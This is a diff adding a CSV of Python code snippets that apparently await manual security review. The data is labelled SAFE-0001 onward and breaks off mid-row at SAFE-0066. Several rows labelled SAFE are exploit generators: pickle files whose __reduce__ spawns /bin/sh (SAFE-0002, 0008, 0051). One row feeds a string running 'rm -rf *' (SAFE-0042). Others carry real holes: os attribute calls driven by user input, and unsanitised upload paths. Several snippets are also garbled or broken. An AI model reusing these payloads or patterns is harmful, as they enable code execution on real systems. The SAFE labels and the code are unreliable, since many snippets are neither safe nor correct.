@@ -1,0 +1,2196 @@
+review_id,original_split,code,manual_status,review_notes
+SAFE-0001,train,"def concatenate_strings(str1, str2):
+    # Check if both inputs are strings
+    if isinstance(str1, str) and isinstance(str2, str):
+        return str1 + str2
+    else:
+        raise ValueError('Both inputs must be strings')
+
+try:
+    user_input = input(""Enter your string: "")
+    print(concatenate_strings(user_input, ""appended-string""))
+except Exception as e:
+    print(""An error occurred: "", e)",pending,""
+SAFE-0002,train,"import pickle
+import subprocess
+
+class RunBinSh(object):
+    def __reduce__(self):
+        return (subprocess.Popen, (['/bin/sh'],))
+
+def serialize_exploit():
+    malicious = pickle.dumps(RunBinSh())
+    with open('malicious.pkl', 'wb') as f:
+        pickle.dump(malicious, f)
+
+if __name__ == ""__main__"":
+    serialize_exploit()",pending,""
+SAFE-0003,train,"class BufferOverflow:
+    def __init__(self):
+        self.buffer = [0] * 1024
+
+    def add_to_buffer(self, data):
+        if not all(isinstance(i, int) for i in data):
+            raise TypeError(""All elements in data must be integers"")
+        if len(data) > 1024:
+            raise ValueError('Buffer overflow')
+        self.buffer[:len(data)] = data
+
+buffer = BufferOverflow()
+try:
+    buffer.add_to_buffer([78]*2000)
+except ValueError as e:
+    print(e)",pending,""
+SAFE-0004,train,"import time
+import hmac
+from hashlib import sha256
+
+# Hashed version of the password
+actual_password = ""5ebe2294ecd0e0f08eab7690d2a6ee69""  # Hashed form of ""secret""
+
+def check_password(input_password):
+    hashed_input_password = sha256(input_password.encode()).hexdigest()
+    if hmac.compare_digest(hashed_input_password, actual_password):
+        return True
+    else:
+        return False
+
+def main():
+    input_password = input(""Enter your password: "")
+    start = time.time()
+    if check_password(input_password):
+        print(""Access granted."")
+    else:
+        print(""Access denied."")
+    end = time.time()
+    print(""Time taken: "", end - start)
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0005,train,"def format_string(user_input):
+    # Sanitize user input by removing leading/trailing whitespaces
+    user_input = user_input.strip()
+    
+    # Check if the user input is empty after sanitization
+    if not user_input:
+        return ""Hello, Stranger!""
+    
+    return f""Hello, {user_input}!""
+
+while True:
+    user_input = input(""Enter your name: "")
+    print(format_string(user_input))",pending,""
+SAFE-0006,train,"def calculate_sum(n1, n2):
+    try:
+        return int(n1) + int(n2)
+    except ValueError:
+        print(""Invalid input. Please enter valid integer values."")
+        return None
+
+num1 = input(""Enter first number: "")
+num2 = input(""Enter second number: "")
+
+result = calculate_sum(num1, num2)
+if result is not None:
+    print(""The sum is: "" + str(result))",pending,""
+SAFE-0007,train,"from flask import Flask, request, redirect, abort
+from urllib.parse import urlparse
+
+app = Flask(__name__)
+
+# List of allowed domains
+ALLOWED_DOMAINS = ['www.example.com', 'www.test.com']
+
+def is_safe_redirect_url(target):
+    ref_url = urlparse(request.host_url)
+    test_url = urlparse(urljoin(request.host_url, target))
+    return test_url.scheme in ('http', 'https') and ref_url.netloc == test_url.netloc and test_url.netloc in ALLOWED_DOMAINS
+
+@app.route('/redirect')
+def safe_redirect():
+    url = request.args.get('url')
+    
+    if not is_safe_redirect_url(url):
+        abort(400)
+
+    return redirect(url)
+
+if __name__ == ""__main__"":
+    app.run(debug=True)",pending,""
+SAFE-0008,train,"import pickle
+import subprocess
+
+class RunBinSh(object):
+    def __reduce__(self):
+        return (subprocess.Popen, (['/bin/sh'],))
+
+def serialize_exploit():
+    malicious = pickle.dumps(RunBinSh(), protocol=0)
+    with open('payload.dat', 'wb') as f:
+        f.write(malicious)
+
+serialize_exploit()",pending,""
+SAFE-0009,train,"import sqlite3
+
+def get_user_info(username):
+    conn = sqlite3.connect('mydatabase.db')
+    cursor = conn.cursor()
+    
+    # Use parameter substitution to avoid SQL injection
+    cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
+    
+    result = cursor.fetchone()
+    return result
+
+username = input(""Enter your username: "")
+print(get_user_info(username))",pending,""
+SAFE-0010,train,"import sqlite3
+import hashlib
+from getpass import getpass
+
+def create_user(username, password):
+    hashed_password = hashlib.sha256(password.encode()).hexdigest()
+    conn = sqlite3.connect('users.db')
+    c = conn.cursor()
+    query = ""INSERT INTO users (username, password) VALUES (?, ?)""
+    c.execute(query, (username, hashed_password))
+    conn.commit()
+    conn.close()
+
+def login(username, password):
+    hashed_password = hashlib.sha256(password.encode()).hexdigest()
+    conn = sqlite3.connect('users.db')
+    c = conn.cursor()
+    query = ""SELECT * FROM users WHERE username=? AND password=?""
+    c.execute(query, (username, hashed_password))
+    user = c.fetchone()
+    conn.close()
+    if user:
+        return True
+    else:
+        return False
+
+if __name__ == ""__main__"":
+    create_user(""admin"", ""password"")
+    print(login(""admin"", ""password"")) # This will print: True
+    print(login(""admin"", ""wrong_password"")) # This will print: False",pending,""
+SAFE-0011,train,"import random
+
+def foo():
+    try:
+        return random.choice([1, 2, 3])
+    except Exception as e:
+        # Log the exception for debugging purpose
+        print(f""An error occurred: {e}"")
+        return None
+
+for _ in range(10):
+    print(foo())",pending,""
+SAFE-0012,train,"def add_numbers(a: int, b: int) -> int:
+    if isinstance(a, int) and isinstance(b, int):
+        return a + b
+    else:
+        raise ValueError(""Both inputs must be integers."")
+
+try:
+    print(add_numbers(1, 2))
+except ValueError as e:
+    print(e)",pending,""
+SAFE-0013,train,"import os
+import sys
+
+def run_command(user_input):
+    if user_input == ""exit"":
+        sys.exit()
+    elif user_input == ""help"":
+        print(""Available commands: dir, exit"")
+    else:
+        try:
+            getattr(os, user_input)()
+        except AttributeError:
+            print(""Invalid command"")
+
+while True:
+    user_input = input(""Enter your command: "")
+    run_command(user_input)",pending,""
+SAFE-0014,train,"class BankAccount:
+    def __init__(self, balance):
+        self.balance = balance
+
+    def withdraw(self, amount):
+        if amount > self.balance:
+            raise ValueError(""Insufficient funds"")
+        self.balance -= amount
+
+bank_account = BankAccount(1000)
+try:
+    bank_account.withdraw(2000)
+except ValueError as e:
+    print(str(e))",pending,""
+SAFE-0015,train,"def get_value(dic, key):
+    return dic.get(key)
+
+my_dict = {""name"": ""John"", ""age"": 30}
+print(get_value(my_dict, ""name""))
+print(get_value(my_dict, ""city""))",pending,""
+SAFE-0016,train,"def vulnerable_function(user_input):
+    if not isinstance(user_input, str):
+        raise ValueError('Invalid input type. Expected string.')
+    msg = f""Hello, {user_input}!""
+    print(msg)
+
+vulnerable_function(""Attacker"")",pending,""
+SAFE-0017,train,"def format_string(user_input):
+    return f""Hello, {user_input}!""
+
+while True:
+    user_input = input(""Enter your name: "")
+    # Validate and sanitize user input
+    if not user_input.isalpha():
+        print(""Invalid input. Please enter a valid name."")
+        continue
+    print(format_string(user_input))",pending,""
+SAFE-0018,train,"import os
+
+def secure_function(user_input):
+    # Check if the file exists
+    if os.path.exists(user_input):
+        # Check if the user has read permissions for the file
+        if os.access(user_input, os.R_OK):
+            try:
+                with open(user_input, 'r') as f:
+                    print(f.read())
+            except IOError as e:
+                print(""An error occurred while reading the file: "", e)
+        else:
+            print(""Permission denied: You do not have read access to this file."")
+    else:
+        print(""The file does not exist."")
+
+if __name__ == ""__main__"":
+    input_from_attacker = ""../../../etc/passwd""
+    secure_function(input_from_attacker)",pending,""
+SAFE-0019,train,"def format_string(user_input):
+    if not isinstance(user_input, str):
+        raise ValueError('Input must be a string')
+    return f""Hello, {user_input}!""
+
+print(format_string(""Attacker""))",pending,""
+SAFE-0020,train,"import hmac
+import os
+from hashlib import sha256
+
+def secure_compare(a, b):
+    if len(a) != len(b):
+        return False
+    result = 0
+    for x, y in zip(a, b):
+        result |= x ^ y
+    return result == 0
+
+message = os.urandom(16)
+key = os.urandom(16)
+digest_maker = hmac.new(key, message, sha256)
+server_mac = digest_maker.digest()
+
+client_mac = os.urandom(32)
+while not secure_compare(client_mac, server_mac):
+    client_mac = os.urandom(32)",pending,""
+SAFE-0021,train,"def process_data(user_input):
+    # Check if the input is a string
+    if not isinstance(user_input, str):
+        raise ValueError('Input must be a string')
+    
+    # Append a null character at the end of the string
+    data = user_input + '\0'
+    return data
+
+def main():
+    user_input = input(""Enter your data: "")
+    
+    # Validate the user input
+    if len(user_input) > 256:  # Adjust this value according to your needs
+        print(""Input too long. Please enter a shorter string."")
+        return
+    
+    try:
+        data = process_data(user_input)
+        print(data)
+    except ValueError as e:
+        print(e)
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0022,train,"import random
+
+def random_divide(a, b):
+    if b == 0:
+        raise ValueError(""Division by zero is not allowed"")
+    return a / b
+
+def main():
+    a = random.randint(0, 10)
+    b = random.randint(0, 10)
+    try:
+        result = random_divide(a, b)
+    except ValueError as ve:
+        print(""An error occurred: "", ve)
+    except Exception as e:
+        print(""An unexpected error occurred: "", e)
+    else:
+        print(""The result is: "", result)
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0023,train,"from flask import Flask, request, abort
+app = Flask(__name__)
+
+@app.route('/echo', methods=['POST'])
+def echo():
+    if 'data' not in request.form:
+        abort(400, ""Missing 'data' field in POST request."")
+    
+    data = request.form['data']
+    
+    # Limit the length of the data to prevent buffer overflow
+    max_length = 1000  # Set your desired maximum length
+    if len(data) > max_length:
+        abort(400, f""'data' field is too long. Maximum allowed length is {max_length} characters."")
+    
+    return f""Echo: {data}""
+
+if __name__ == '__main__':
+    app.run(port=8000)",pending,""
+SAFE-0024,train,"import struct
+
+def parse_data(data):
+    fmt = '<' + str(len(data)) + 's'
+    if len(data) > struct.calcsize(fmt):
+        raise ValueError(""Data too large for format string"")
+    tup = struct.unpack(fmt, data)
+    return tup[0]
+
+data = b'\x01\x02\x03\x04\x05'  # This data is larger than the format string expects
+try:
+    print(parse_data(data))
+except ValueError as e:
+    print(e)",pending,""
+SAFE-0025,train,"import ast
+import os
+
+def safe_eval(node):
+    if isinstance(node, ast.Expression):
+        node = node.body
+    if isinstance(node, ast.Str):
+        return node.s
+    elif isinstance(node, ast.Num):
+        return node.n
+    elif isinstance(node, ast.BinOp):
+        left = safe_eval(node.left)
+        right = safe_eval(node.right)
+        if isinstance(node.op, ast.Add):
+            return left + right
+        elif isinstance(node.op, ast.Sub):
+            return left - right
+        elif isinstance(node.op, ast.Mult):
+            return left * right
+        elif isinstance(node.op, ast.Div):
+            return left / right
+    else:
+        raise ValueError('Unsupported operation')
+
+user_input = input(""Enter your command: "")
+print(safe_eval(ast.parse(user_input, mode='eval')))",pending,""
+SAFE-0026,train,"from flask import Flask, request, escape
+
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    name = request.args.get('name', '')
+    # Escaping user inputs to prevent XSS attacks
+    name = escape(name)
+    return ""Hello, {}!"".format(name)
+
+if __name__ == ""__main__"":
+    app.run(debug=True)",pending,""
+SAFE-0027,train,"from flask import Flask, request, abort
+import os
+
+UPLOAD_DIRECTORY = ""/var/www/uploads/""
+
+if not os.path.exists(UPLOAD_DIRECTORY):
+    os.makedirs(UPLOAD_DIRECTORY)
+
+app = Flask(__name__)
+
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    if 'file' not in request.files:
+        return abort(400, 'No file part')
+    file = request.files['file']
+    filename = file.filename
+    if filename == '':
+        return abort(400, 'No selected file')
+    if file:
+        file.save(os.path.join(UPLOAD_DIRECTORY, filename))
+        return 'File uploaded successfully!'
+
+if __name__ == ""__main__"":
+    app.run(host='0.0.0.0', port=80)",pending,""
+SAFE-0028,train,"import pickle
+import subprocess
+
+class SafePickle(object):
+    def __reduce__(self):
+        return (subprocess.run, (['echo', 'You have been hacked'],))
+
+def serialize_exploit():
+    with open('exploit.pkl', 'wb') as f:
+        pickle.dump(SafePickle(), f)
+
+serialize_exploit()",pending,""
+SAFE-0029,train,"import random
+
+def random_function():
+    return random.randint(0, 10)
+
+def main_function():
+    try:
+        result = random_function()
+        print(""The result is: "", result)
+    except Exception:
+        # An empty except clause will catch all exceptions. It's better to log the error for debugging purpose.
+        import traceback
+        traceback.print_exc()
+
+main_function()",pending,""
+SAFE-0030,train,"import requests
+from requests.exceptions import RequestException
+
+def fetch_data(url):
+    try:
+        response = requests.get(url, timeout=5)
+        response.raise_for_status()  # Raise exception for HTTP errors
+        data = response.json()
+        return data
+    except RequestException as e:
+        print(""Error occurred: "", e)
+    except Exception as e:
+        print(""Unexpected error occurred: "", e)
+
+def main():
+    url = ""http://example.com/api""
+    data = fetch_data(url)
+    if data:
+        print(data)
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0031,train,"import ast
+
+def safe_eval(node):
+    if isinstance(node, ast.Expression):
+        node = node.body
+    if isinstance(node, ast.Str):
+        return node.s
+    elif isinstance(node, ast.Num):
+        return node.n
+    elif isinstance(node, ast.BinOp):
+        op = {ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul, ast.Div: operator.truediv}
+        return op[type(node.op)](safe_eval(node.left), safe_eval(node.right))
+    else:
+        raise TypeError(node)
+
+user_input = input(""Enter something: "")
+tree = ast.parse(user_input, mode='eval')
+result = safe_eval(tree.body)
+print(result)",pending,""
+SAFE-0032,train,"def fibonacci(n, computed = {0: 0, 1: 1}):
+    if n not in computed:
+        computed[n] = fibonacci(n-1, computed) + fibonacci(n-2, computed)
+    return computed[n]
+
+print(fibonacci(50))",pending,""
+SAFE-0033,train,"import sqlite3
+
+def get_user_info(username):
+    conn = sqlite3.connect('mydatabase.db')
+    cursor = conn.cursor()
+    
+    # Use parameter substitution to avoid SQL injection
+    cursor.execute(""SELECT * FROM users WHERE username = ?"", (username,))
+    
+    user_info = cursor.fetchone()
+    return user_info
+
+# Testing the function
+print(get_user_info(""john""))",pending,""
+SAFE-0034,train,"import ast
+
+def safe_function():
+    user_input = input(""Enter a command: "")
+    try:
+        # Use the ast.literal_eval function instead of eval 
+        # to parse the user's input as a literal structure
+        ast.literal_eval(user_input)
+    except SyntaxError:
+        print(""Invalid input"")
+    except ValueError:
+        print(""Invalid input"")
+
+safe_function()",pending,""
+SAFE-0035,train,"class SecureClass:
+    def __init__(self):
+        self.data = []
+
+    def add_data(self, item):
+        if isinstance(item, (int, float)):
+            self.data.append(item)
+        elif isinstance(item, str):
+            self.data.append(item)
+        else:
+            raise ValueError('Unsupported data type')
+
+    def get_data(self):
+        return self.data
+
+secure_obj = SecureClass()
+secure_obj.add_data(10)
+secure_obj.add_data(""Hello"")
+print(secure_obj.get_data())",pending,""
+SAFE-0036,train,"import sys
+
+def read_file(filename):
+    try:
+        with open(filename, 'rb') as f:
+            return f.read()
+    except FileNotFoundError:
+        print(f""File {filename} not found."")
+        sys.exit(1)
+    except Exception as e:
+        print(f""Error reading file {filename}: {str(e)}"")
+        sys.exit(1)
+
+def write_file(filename, data):
+    try:
+        with open(filename, 'wb') as f:
+            f.write(data)
+    except Exception as e:
+        print(f""Error writing file {filename}: {str(e)}"")
+        sys.exit(1)
+
+def copy_file(src, dest):
+    data = read_file(src)
+    if data:
+        write_file(dest, data)
+
+if __name__ == ""__main__"":
+    if len(sys.argv) != 3:
+        print(""Usage: python3 exploit.py <source> <destination>"")
+        sys.exit(1)
+
+    src = sys.argv[1]
+    dest = sys.argv[2]
+
+    copy_file(src, dest)",pending,""
+SAFE-0037,train,"def secure_function(user_input):
+    max_length = 1024
+    if len(user_input) > max_length:
+        raise ValueError(""Input too long"")
+
+    buffer = bytearray(max_length)
+    for i in range(len(user_input)):
+        buffer[i] = ord(user_input[i])
+    return buffer
+
+try:
+    user_input = input(""Enter your input: "")
+    print(secure_function(user_input))
+except ValueError as e:
+    print(e)",pending,""
+SAFE-0038,train,"import logging
+
+class User:
+    def __init__(self, username, password):
+        self.username = username
+        self.password = password
+
+def authenticate_user(users, username, password):
+    for user in users:
+        if user.username == username and user.password == password:
+            return True
+    return False
+
+def login():
+    users = [User('admin', 'password')]
+    username = input(""Enter your username: "")
+    password = input(""Enter your password: "")
+    
+    try:
+        if authenticate_user(users, username, password):
+            print(""Login successful"")
+        else:
+            print(""Invalid credentials"")
+    except Exception as e:
+        logging.exception(""An error occurred: "")  # This will log the exception traceback
+
+login()",pending,""
+SAFE-0039,train,"import ast
+
+def safe_eval(node):
+    if isinstance(node, ast.Expression):
+        node = node.body
+    if isinstance(node, ast.Str):
+        return node.s
+    elif isinstance(node, ast.Num):
+        return node.n
+    elif isinstance(node, ast.BinOp):
+        left = safe_eval(node.left)
+        right = safe_eval(node.right)
+        if isinstance(node.op, ast.Add):
+            return left + right
+        elif isinstance(node.op, ast.Sub):
+            return left - right
+        elif isinstance(node.op, ast.Mult):
+            return left * right
+        elif isinstance(node.op, ast.Div):
+            return left / right
+    else:
+        raise ValueError('Unsupported operation')
+
+user_input = input(""Enter something here: "")
+tree = ast.parse(user_input, mode='eval')
+result = safe_eval(tree.body)
+print(result)",pending,""
+SAFE-0040,train,"import logging
+import traceback
+
+class CustomException(Exception):
+    def __init__(self, message):
+        super().__init__(message)
+        self.message = message
+
+def raise_exception():
+    try:
+        raise CustomException(""This is a custom exception"")
+    except Exception:
+        error_msg = traceback.format_exc()
+        logging.error(error_msg)
+        return error_msg
+
+raise_exception()",pending,""
+SAFE-0041,train,"import subprocess
+
+def some_function():
+    try:
+        output = subprocess.check_output(['ls'])
+        print(output.decode())
+    except subprocess.CalledProcessError as e:
+        print(""An error occurred while executing the command: "", e)
+
+if __name__ == ""__main__"":
+    some_function()",pending,""
+SAFE-0042,train,"import re
+
+def sanitize_input(user_input):
+    # This is a basic sanitization function. In a real-world scenario, you would need a more robust solution.
+    if re.search('[a-zA-Z_]', user_input):
+        return False
+    return True
+
+def safe_eval(user_input):
+    if sanitize_input(user_input):
+        # Use ast.literal_eval instead of eval to prevent arbitrary code execution
+        return ast.literal_eval(user_input)
+    else:ivalueError(""Invalid input"")
+
+safe_eval(""__import__('os').system('rm -rf *')"")",pending,""
+SAFE-0043,train,"import ast
+import operator as op
+
+# Define allowed operations
+allowed_operations = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul, ast.Div: op.truediv}
+
+class Visitor(ast.NodeVisitor):
+    def visit_BinOp(self, node):
+        try:
+            self.generic_visit(node)  # visit children first
+            left = node.left.n
+            right = node.right.n
+            return allowed_operations[type(node.op)](left, right)
+        except Exception:
+            raise ValueError('Invalid operation')
+
+    def visit_Num(self, node):
+        node.n = node.n
+
+def evaluate(expr):
+    tree = ast.parse(expr, mode='eval')  # parse expression into AST
+    visitor = Visitor()
+    visitor.visit(tree)  # evaluate expression
+    return visitor.visit(tree)
+
+user_input = input(""Enter something: "")
+print(evaluate(user_input))",pending,""
+SAFE-0044,train,"def secure_function(user_input):
+    max_length = 100
+    if len(user_input) > max_length:
+        raise ValueError(""Input too long"")
+    buffer = bytearray(max_length)
+    for i in range(len(user_input)):
+        buffer[i] = user_input[i]
+    return buffer
+
+# Attacker controlled input
+attacker_input = ""A"" * 200
+try:
+    print(secure_function(attacker_input))
+except ValueError as e:
+    print(e)",pending,""
+SAFE-0045,train,"def get_user_input():
+    while True:
+        user_input = input(""Enter your name: "")
+        if len(user_input) <= 20: # set a reasonable limit on user input length
+            return user_input
+        else:
+            print(""Name is too long. Please enter a name less than 20 characters."")
+
+def print_user_info(user_name):
+    info = ""Hello, {0}!"".format(user_name)
+    print(info)
+
+def main():
+    user_name = get_user_input()
+    print_user_info(user_name)
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0046,train,"def format_string(user_input):
+    return f""User input: {user_input}""
+
+def main():
+    user_input = input(""Enter some text: "")
+    # Sanitize user input to prevent any form of injection attacks
+    sanitized_input = user_input.encode('utf-8', 'ignore').decode('utf-8')
+    formatted = format_string(sanitized_input)
+    print(formatted)
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0047,train,"import socket
+import errno
+
+def handle_client(client_socket):
+    try:
+        data = client_socket.recv(1024)
+        if not data:
+            raise Exception(""No data received"")
+        print(""Received: "", data)
+    except socket.error as e:
+        if e.errno != errno.ECONNRESET:
+            raise
+        return
+    except Exception as e:
+        print(""Error: "", e)
+    finally:
+        client_socket.close()
+
+def main():
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server_socket.bind(('localhost', 8080))
+    server_socket.listen(5)
+
+    while True:
+        try:
+            client_socket, address = server_socket.accept()
+            handle_client(client_socket)
+        except KeyboardInterrupt:
+            break
+
+    server_socket.close()
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0048,train,"import ctypes
+
+def create_string(size):
+    if size <= 0:
+        raise ValueError(""Size must be greater than zero"")
+    return ctypes.create_string_buffer(size)
+
+def overflow_string(s, index, value):
+    if index < 0 or index >= len(s):
+        raise IndexError(""Index out of range"")
+    s[index] = value
+
+try:
+    s = create_string(20)
+    overflow_string(s, 19, b'X')
+except Exception as e:
+    print(f""An error occurred: {e}"")",pending,""
+SAFE-0049,train,"import ast
+import operator as op
+
+# Define allowed operations
+allowed_operations = {
+    '+': op.add,
+    '-': op.sub,
+    '*': op.mul,
+    '/': op.truediv,
+}
+
+def get_user_input():
+    return input(""Enter your command: "")
+
+def parse_command(command):
+    tree = ast.parse(command, mode='eval')  # Parse the user input into an AST
+    
+    if len(tree.body.args) != 2:  # Check if the user input has exactly two arguments
+        raise ValueError('Invalid command')
+
+    left = tree.body.args[0].n
+    right = tree.body.args[1].n
+    op = allowed_operations[tree.body.op]  # Get the operation from the allowed operations
+
+    return op(left, right)  # Perform the operation
+
+while True:
+    try:
+        command = get_user_input()
+        result = parse_command(command)
+        print(result)
+    except Exception as e:
+        print(f""An error occurred: {e}"")",pending,""
+SAFE-0050,train,"# Import required module
+import ast
+import operator as op
+
+# Define allowed operations
+operations = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul,
+             ast.Div: op.truediv, ast.USub: op.neg}
+
+# Define a function to evaluate the expression
+def calculate_expression(node):
+    if isinstance(node, ast.Num):
+        return node.n
+    elif isinstance(node, ast.BinOp):  
+        return operations[type(node.op)](calculate_expression(node.left), calculate_expression(node.right))
+    elif isinstance(node, ast.UnaryOp): 
+        return operations[type(node.op)](calculate_expression(node.operand))
+    else:
+        raise TypeError(node)
+
+# Get user input
+user_input = input(""Enter an expression: "")
+
+# Parse the user input into an abstract syntax tree
+tree = ast.parse(user_input, mode='eval')
+
+# Calculate expression
+result = calculate_expression(tree.body)
+
+# Print result
+print(""The result is: "", result)",pending,""
+SAFE-0051,train,"import pickle
+import subprocess
+
+class RunBinSh(object):
+    def __reduce__(self):
+        return (subprocess.Popen, (['/bin/sh'],))
+
+def serialize_exploit():
+    malicious = pickle.dumps(RunBinSh(), protocol=0)
+    with open('payload.dat', 'wb') as f:
+        pickle.dump(malicious, f)
+
+if __name__ == ""__main__"":
+    serialize_exploit()",pending,""
+SAFE-0052,train,"import sqlite3
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/user/<username>')
+def get_user(username):
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    # Use parameterized queries to prevent SQL injection
+    query = ""SELECT * FROM users WHERE username = ?""
+    result = cursor.execute(query, (username,))
+    return result.fetchone()
+
+if __name__ == '__main__':
+    app.run(debug=True)",pending,""
+SAFE-0053,train,"import sqlite3
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+    conn = sqlite3.connect('user_data.db')
+    cursor = conn.cursor()
+    query = ""SELECT * FROM users WHERE username=? AND password=?""
+    cursor.execute(query, (username, password))
+    data = cursor.fetchone()
+    if data is None:
+        return ""Login failed.""
+    else:
+        return ""Login successful.""
+
+if __name__ == '__main__':
+    app.run(debug=True)",pending,""
+SAFE-0054,train,"import hmac
+import time
+import os
+from werkzeug.security import safe_str_cmp
+
+# Generate a random secret key
+SECRET_KEY = os.urandom(16)
+
+def check_password(input_password):
+    stored_password = ""correctpassword""
+    if len(input_password) != len(stored_password):
+        return False
+    # Use HMAC to compare the passwords safely
+    return hmac.compare_digest(input_password, stored_password)
+
+def main():
+    print(""Enter your password:"")
+    user_password = input()
+    start_time = time.time()
+    if check_password(user_password):
+        end_time = time.time()
+        print(""Access granted."")
+        print(""Time taken: "", end_time - start_time)
+    else:
+        print(""Access denied."")
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0055,train,"import sqlite3
+
+def get_user_info(username):
+    conn = sqlite3.connect('mydatabase.db')
+    cursor = conn.cursor()
+    # Use parameterized inputs to prevent SQL injection
+    cursor.execute(""SELECT * FROM users WHERE username = ?"", (username,))
+    result = cursor.fetchone()
+    return result
+
+# Example usage
+print(get_user_info(""test' OR '1'='1""))",pending,""
+SAFE-0056,train,"def overflow_buffer(data):
+    buffer = bytearray(10)
+    for i in range(min(len(data), len(buffer))):
+        buffer[i] = data[i]
+    return buffer
+
+data = bytearray(20)
+for i in range(20):
+    data[i] = 0x41
+
+print(overflow_buffer(data))",pending,""
+SAFE-0057,train,"from flask import Flask, request, jsonify
+import ast
+import operator as op
+
+# Define the supported operators
+operators = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul,
+            ast.Div: op.truediv, ast.USub: op.neg}
+
+app = Flask(__name__)
+
+class Visitor(ast.NodeVisitor):
+    def visit_BinOp(self, node):
+        left = self.visit(node.left)
+        right = self.visit(node.right)
+        return operators[type(node.op)](left, right)
+
+    def visit_Num(self, node):
+        return node.n
+
+    def visit_Expr(self, node):
+        return self.visit(node.value)
+
+    def visit_UnaryOp(self, node):
+        return operators[type(node.op)](self.visit(node.operand))
+
+    @classmethod
+    def evaluate(cls, expression):
+        tree = ast.parse(expression, mode='eval')
+        visitor = cls()
+        return visitor.visit(tree.body)
+
+@app.route('/evaluate', methods=['POST'])
+def evaluate():
+    data = request.get_json()
+    result = Visitor.evaluate(data['expression'])
+    return jsonify({""result"": result})
+
+if __name__ == '__main__':
+    app.run(debug=True)",pending,""
+SAFE-0058,train,"import sqlite3
+from sqlite3 import Error
+
+def create_connection():
+    conn = None;
+    try:
+        conn = sqlite3.connect('my_database.db')
+        print(f'Successfully Connected to SQLite')
+    except Error as e:
+        print(e)
+    return conn
+
+def fetch_user_data(conn, username):
+    cursor = conn.cursor()
+    cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
+    rows = cursor.fetchall()
+    for row in rows:
+        print(row)
+
+def main():
+    conn = create_connection()
+    if conn is not None:
+        username = input(""Enter your username: "")
+        fetch_user_data(conn, username)
+    else:
+        print(""Failed to connect to SQLite"")
+
+if __name__ == '__main__':
+    main()",pending,""
+SAFE-0059,train,"import struct
+import socket
+
+def receive_and_process_data(sock):
+    data = sock.recv(1024)
+    if len(data) < 4:
+        raise Exception(""Received less than 4 bytes"")
+    unpacked_data = struct.unpack('>I', data[:4])
+    return unpacked_data[0]
+
+def process_request(sock):
+    while True:
+        try:
+            data = receive_and_process_data(sock)
+            # Process the data...
+        except Exception as e:
+            print(f""Error occurred: {e}"")
+            break",pending,""
+SAFE-0060,train,"def process_input(user_input):
+    buffer = bytearray(1024)
+    for i in range(min(len(user_input), len(buffer))):
+        buffer[i] = ord(user_input[i])
+    return buffer
+
+while True:
+    user_input = input(""Enter your input: "")
+    print(process_input(user_input))",pending,""
+SAFE-0061,train,"from flask import Flask, request
+import ast
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    command = request.args.get('command', '')
+    if command:
+        # Use ast.literal_eval instead of eval. It parses an expression node.
+        # ast.literal_eval raises ValueError for invalid syntax and SyntaxError for illegal
+        # constructs. This makes it safe to use for evaluating user input.
+        try:
+            ast.literal_eval(command)
+        except (ValueError, SyntaxError):
+            return ""Invalid command"", 400
+    return ""Command executed successfully""
+
+if __name__ == '__main__':
+    app.run(debug=True)",pending,""
+SAFE-0062,train,"import ast
+import operator as op
+
+# Define allowed operations
+allowed_operations = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul, ast.Div: op.truediv}
+
+class Visitor(ast.NodeVisitor):
+    def visit_BinOp(self, node):
+        try:
+            left = self.visit(node.left)
+            right = self.visit(node.right)
+            return allowed_operations[type(node.op)](left, right)
+        except Exception as e:
+            raise ValueError('Invalid operation')
+
+    def visit_Num(self, node):
+        return node.n
+
+    def visit_Expr(self, node):
+        return self.visit(node.value)
+
+    def visit_Call(self, node):
+        raise ValueError('Functions are not allowed')
+
+def safe_code_execution(user_input):
+    tree = ast.parse(user_input, mode='eval')
+    visitor = Visitor()
+    result = visitor.visit(tree)
+    print(result)
+
+safe_code_execution(input(""Enter your command: ""))",pending,""
+SAFE-0063,train,"def greet_user(user_input):
+    print(""Hello, {}"".format(user_input))
+
+def main():
+    user_input = input(""Enter your name: "")
+    # validate user input here if necessary
+    greet_user(user_input)
+
+if __name__ == ""__main__"":
+    main()",pending,""
+SAFE-0064,train,"import socket
+
+def create_connection():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect((""example.com"", 80))
+    except Exception as e:
+        print(f""Exception occurred: {e}"")
+        s.close()
+        return None
+    return s
+
+connections = []
+for i in range(10000):
+    conn = create_connection()
+    if conn is not None:
+        connections.append(conn)
+
+# Close all connections after use
+for conn in connections:
+    conn.close()",pending,""
+SAFE-0065,train,"def receive_input():
+    user_input = input(""Enter your input: "")
+    buffer = bytearray(min(len(user_input), 10)) # Limit the buffer size to 10
+    for i in range(len(buffer)):
+        buffer[i] = ord(user_input[i])
+    return buffer
+
+print(receive_input())",pending,""
+SAFE-0066,train,"from flask import Flask, request
+import ast
+
+app = Flask(__name__)
+
+@app.route('/evaluate', methods=['POST'])
+def evaluate():
+    data = request.form.get('data')
+    
+    # Validate and sanitize the input
+    if data is None:
+        return ""No data provided"", 400
+    
+    # Use ast.literal_eval instead of eval for safe evaluation
+    try:
+        result = ast.literal_eval(data)
+    except (ValueError, SyntaxError):
+        return ""Invalid data"", 400
